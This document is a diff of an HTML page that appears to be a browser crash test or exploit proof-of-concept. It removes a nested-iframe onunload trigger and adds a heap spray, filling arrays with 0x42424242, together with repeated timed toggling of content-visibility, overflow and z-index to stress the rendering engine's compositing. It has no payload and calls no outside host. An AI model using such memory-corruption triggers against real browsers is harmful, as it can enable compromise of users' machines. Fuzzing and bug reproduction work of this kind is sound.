@@ -1,19 +1,72 @@
-<body> <script>
-let f = document.body.appendChild(document.createElement('iframe'));
-let g = f.contentDocument.body.appendChild(document.createElement('iframe'));
-g.contentWindow.onunload = () => {
-g.contentWindow.onunload = null;
+<!DOCTYPE html>
+<html>
+<head>
+    <style>
+        .outer {
+            width: 200px;
+            height: 200px;
+            overflow: hidden;
+            position: relative;
+            contain: strict;
+        }
+        .inner {
+            width: 100px;
+            height: 100px;
+            position: absolute;
+            content-visibility: auto;
+            z-index: 1;
+            transform: translateZ(0); /* Force compositing */
+        }
+        .child {
+            width: 50px;
+            height: 50px;
+            position: absolute;
+            content-visibility: hidden;
+        }
+    </style>
+</head>
+<body>
+    <div class="outer" id="outer">
+        <div class="inner" id="inner">
+            <div class="child" id="child"></div>
+        </div>
+    </div>
+    <script>
+        let spray = [];
+        function sprayHeap() {
+            for (let i = 0; i < 5000; i++) {
+                let arr = new Array(0x100).fill(0x42424242);
+                spray.push(arr);
+            }
+        }
 
-let h = f.contentDocument.body.appendChild(document.createElement('iframe'));  
-h.contentWindow.onunload = () => {  
-    h.contentWindow.onunload = null;  
+        function trigger() {
+            let outer = document.getElementById('outer');
+            let inner = document.getElementById('inner');
+            let child = document.getElementById('child');
 
-    let a = f.contentDocument.createElement('a');  
-    a.href = 'about:blank';  
-    a.click();  
-};  
-};
+            // Toggle visibility and overflow to stress compositing
+            child.style.contentVisibility = 'visible';
+            outer.style.overflow = 'scroll';
+            setTimeout(() => {
+                child.style.contentVisibility = 'hidden';
+                outer.style.overflow = 'hidden';
+                sprayHeap();
+                // Add a new layer to force compositing update
+                let newDiv = document.createElement('div');
+                newDiv.style.cssText = 'position: absolute; width: 50px; height: 50px; z-index: 2; content-visibility: auto;';
+                inner.appendChild(newDiv);
+                setTimeout(() => {
+                    inner.style.zIndex = '3';
+                    inner.removeChild(newDiv);
+                }, 5);
+            }, 5);
+        }
 
-f.src = 'about:blank';
-
-</script> </body>
+        // Repeat with varying delays
+        for (let i = 0; i < 200; i++) {
+            setTimeout(trigger, i * 50);
+        }
+    </script>
+</body>
+</html>
